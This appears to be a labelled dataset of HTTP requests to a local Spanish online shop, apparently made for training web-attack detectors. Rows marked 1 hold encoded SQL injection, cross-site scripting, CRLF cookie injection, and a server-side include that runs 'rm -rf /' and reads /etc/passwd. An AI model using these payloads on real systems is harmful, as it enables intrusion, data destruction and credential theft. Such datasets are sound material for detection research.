URL,Target
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=mcgee&password=ab*rIGaDERo&nombre=Salom%F3n&apellidos=Castany+Bigorra&email=karapiet%40novaservicios.gr&dni=02030491M&direccion=Mantua+35%2C+&ciudad=Instinci%F3n&cp=28512&provincia=Navarra&ntc=1541713650880969&B1=Registrar,1
http://localhost:8080/tienda1/asf-logo-wide,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=23&B1=A%F1adir+al+carrito,0
http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=krozser&password=975ctica&nombreA=Her%F3n&apellidos=Mogrovejo+Garibaldi&email=nitschke%40barcafedaniss.tr&dni=46288707B&direccion=Calle+Cartagena%2C+122+10%3FD&ciudad=Mu%ED%F1os&cp=12414&provincia=Lleida&ntc=0281286910316978&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kanya&password=trasladadora&nombre=Angelo&apellidos=Goya+Asensio&email=bowers%40puntodevistafotografia.gf&dni=56007542N&direccion=C%2F+Baja+58%2C+1%3FH&ciudad=Helechosa+de+los+Montes&cp=10181&provincia=Valencia&ntc=8914897432837758&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8409&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sonni&password=ayate&nombre=Babilas&apellidos=Tijerin+Monaghan&email=suchet%40ciaplast.tel&dni=57584234P&direccion=Maestro+De+Burgos%2C+199+&ciudad=Cambil&cp=05357&provincia=Murcia&ntc=6482564727426112&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lysinger&password=D9SOr9an21a2oR&nombre=Giovana&apellidos=Planelles+Neris&email=%40hav%40%40oc%40librodeapuntes.cn&dni=54498003D&direccion=C%2F+Fuensanta+41+&ciudad=Sangarr%E9n&cp=32650&provincia=Huesca&ntc=5070328292613697&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precioA=100&cantidad=20&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=thibaud79&pwd=r393lin3nte&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hanzlice&password=ras4RojAR&nombre=Thayra&apellidos=Guardiola+Puertolas&email=bearse%40cdgranadabaila.lv&dni=32493489D&direccion=C%2F+Portal+De+Zamudio+65%2C+&ciudad=Sant+Andreu+Salou&cp=37120&provincia=C%E1ceres&ntc=5385467629611173&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gofron&password=emenda&nombre=Ranger&apellidos=Jalmar+Arambide&email=avdjusko.polivitskiui%40javilasan.kr&dni=364419A4P&direccion=C%2F+Huerta+El+Palomar%2C+S%2FN%2C+&ciudad=Moral+de+la+Reina&cp=26321&provincia=Navarra&ntc=8906753589581639&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=colline&password=h30i2o&nombre=Sylvina&apellidos=Mateu+Bernaus%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&email=sorili%40am-si.nf&dni=75667654T&direccion=C%2F+Del+Torrent+De+L%27olla%2C+111+11%3FD&ciudad=Fuerte+del+Rey&cp=49610&provincia=Guadalajara&ntc=5880986678228634&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=deng&password=5331q572403Eo&nombre=Sol&apellidos=Zuazola+Sauli&email=renavent%4014horas.aero&dni=90456703A&direccion=Amor+De+Dios+14+1-C&ciudad=Villaca%F1as&cp=50580&provincia=Burgos&ntc=1928866746841107&B1=Registrar,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=leppert&pwd=6albu-ce9r&remember=off%2F&B1=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=o.neil&pwd=6A0atO&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vehling&password=cargadas&nombre=Rodipo&apellidos=Peteiro&email=szmidt%40surcosur.id&dniA=64709043S&direccion=Calle+Ourense+119+5%3FF&ciudad=Puerto+Real&cp=15004&provincia=Guadalajara&ntc=0132612345545070&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7041&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=myong&password=colOrISmo&nombre=Dagmar&apellidos=Cabane+Molas&email=holton%40enigmatico.vu&dni=91624095F&direccion=Don+Ferreol+Hernandez+S%2FN%2C+&ciudad=Calders&cp=37183&provincia=Salamancaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ntc=6035116303925311&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kolahi45&password=o5%2457t4&nombre=Segismundo&apellidos=Torr%E0&email=unkel-richler%40nanogenerador.bu&dni=482865631&direccion=Calle+Puerto+Oncala%2C+80%2C+7%3FG&ciudad=Almazul&cp=20495&provincia=Navarra&ntc=9824241120494731&B1=Registrar,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/titulo.jsp.inc,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mclellan&password=calabrote&nombre=Celmira&apellidos=Delgados+Rodrigo&emailA=huster%40alquilerpantallasled.an&dni=02547887Q&direccion=Barrio+Nuevo%2C+34+&ciudad=Torroella+de+Fluvi%E0&cp=22650&provincia=Segovia&ntc=3100489069524720&B1=Registrar,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/admin/logon.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp/4861362529278789730,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,1
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.old,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=waring&pwd=445uG4&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?idA=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=55&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif,1
http://localhost:8080/tienda1/imagenes/1.gif.Inc,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=4&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Queso+Manchego&precio=39&cantidad=24&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*corn%27eliu&pwd=dESHILadIZ&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=salome&password=aguazo&nombre=Jahu&apellidos=Bol%E0s&email=boa4%40sitienesunawebtienesunnegocio.es&dni=18726543N&direccion=Bloc+Bic%2C+S%2FN%2C+12C&ciudad=Estollo&cp=43320&provincia=Palencia&ntc=9115119907815313&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zadeh&password=enar0ar&nombre=Marcia&apellidos=Porteria+Estades&emailA=merkinson%40pintandomucho.gg&dni=05145490E&direccion=Calle+Belateko+Monasterioaren%2C+192%2C+2%3FE&ciudad=Alcal%E1+del+Obispo&cp=03794&provincia=Valencia&ntc=1153905778243481&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=coursdev&pwd=filicidio&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/fotos.jsp/6909030637832563290.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=%257C&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pilcher&password=0int67no&nombre=Petrona&apellidos=Sejas+Escriba&email=alfaro%40inventoscaseros.cat&dni=A9131305N&direccion=Passatge+Centelles%2C+19+&ciudad=Coir%F3s&cp=03517&provincia=La+Rioja&ntc=4788743133970052&B1=Registrar,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=widuch&password=7AM2R0%CD502&nombre=Aladino&apellidos=Iriarte+Porres&email=gahan_boorman%40eneltajo.tt&dni=93685529C&direccion=Pl.+Del+Mexuar%2C+179%2C+1-D&ciudad=%3F&cp=26288&provincia=Soria&ntc=5513132638351756&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=willy&password=c53p7t25064&nombre=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&apellidos=Pujos+Janeiro&email=eberle%40baybay.tg&dni=85025185G&direccion=De+La+Vega+4%2C+&ciudad=Casasimarro&cp=21340&provincia=A+Coru%F1a&ntc=7642131917731646&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=armelle&password=en6l46h636&nombre=Bonifacio&apellidos=Barriga+Requena&email=guerreiro%40arroyo-molinos.je&dni=64522500W&direccion=C%2F+De+Las+Violetas%2C+104%2C+&ciudad=Salar&cp=37314&provincia=Valladolid&ntc=7441005651932884&B1=Registrar,0
http://localhost:8080/_vti_bin/,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%257C,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/4861362529278789730,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=orford&password=1ojador&nombre=Ratbodo&apellidos=Fabrelle&email=pupinyo%40multaspendientes.ve&dni=80725413J&direccion=C%2F+Sagrada+Familia+176+&ciudad=Gajanejos&cp=44432&provincia=Zamora&ntc=3400796495784367&B1=Registrar,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=willy&password=c53p7t25064&nombre=Aidano&apellidos=Pujos+Janeiro&email=eberle%40baybay.tg&dni=85025185G&direccion=De+La+Vega+4%2C+&ciudad=Casasimarro&cp=21340&provincia=A+Coru%F1a&ntc=841140437746594A&B1=Registrar,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=55&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/global/creditos.jsp.OLD,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laforge&pwd=o1R8me956&remember=off%2F&B1=Entrar,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/IISSamples/sdk/asp/applications/Session_JScript.asp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/CFIDE/administrator/header.cfm,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=prestipi&password=trinar&nombre=Sulamita&apellidos=Serrat&email=warbeck%40tabernarinconete.tz&dni=52485262K&direccion=Calle+Monges%2C+28%2C+3-F&ciudad=Banyalbufar&cp=05292&provincia=Salama.nc.a&ntc=5196721943648454&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasAND+1%3D1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&precio=2794&B1=Confirmar,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif/~,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Jam%F3n+Ib%E9rico&precio=100&cantidad=97&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=paddie&password=pU1ada&nombreA=Lebana&apellidos=Garriga+Faja&email=allaylis-lowler%40lasmilyuna.sh&dni=87878927K&direccion=Calle+Azuaga+S%2FN+5-A&ciudad=Torrefarrera&cp=18130&provincia=Cantabria&ntc=2426074122150919&B1=Registrar,1
http://localhost:8080/tienda1/publico/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidadA=34&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidadA=98&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=56&B1=%2B,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%253F,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=66&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=luna&password=2un4141ali46r&nombre=Ado&apellidos=Macuare+Ribes&email=embree_chevret%40softwaremasservicio.bs&dni=59388065H&direccion=C%2F+Violeta%2C+S%2FN+9-B&ciudad=Ingenio&cp=40290&provincia=Navarra&ntc=7144713031308851&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lrcrich&pwd=VEGuER%CDa&remember=on%2F&B1=Entrar,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thur%3Fston&password=%24leo&nombre=Clacer&apellidos=Roza+Port%E9s&email=argibay_galabrue7%40am-si.kn&dni=59004252Y&direccion=Pla%E7a+D%27+Hostafrancs+102+&ciudad=Arjonilla&cp=37338&provincia=Vizcaya&ntc=6040441906133947&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/miembros/asf-logo-wide,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/6909030637832563290.jsp,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%2Bjay&pwd=pre7u5t05a&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/asf-logo-wide.Inc,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krug&pwd=mi5-a&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1.old,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helma&password=92H126nA&nombre=Francisco+de+Borja&apellidos=Sofra+Galcer%E1n&email=mizell%40x2.com.vu&dni=61328646C&direccion=Parc+De+La+Budellera%2C+3%2C+4-B&ciudad=Outes&cp=43421&provincia=Huesca&ntc=0417370510264127&B1=Registrar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Queso+Manchego&precio=85&cantidad=52&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=reiser&password=fi33%F38841&nombre=Palmira&apellidos=Rocha+Pello&email=terry-lewis.macdougall%40ofertaschinas.gd&dni=46644989T%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&direccion=Calle+Los+Hotelitos+S%2FN%2C+&ciudad=Alforja&cp=06200&provincia=Madrid&ntc=6898289931368660&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=39&cantidad=15&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2373&B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
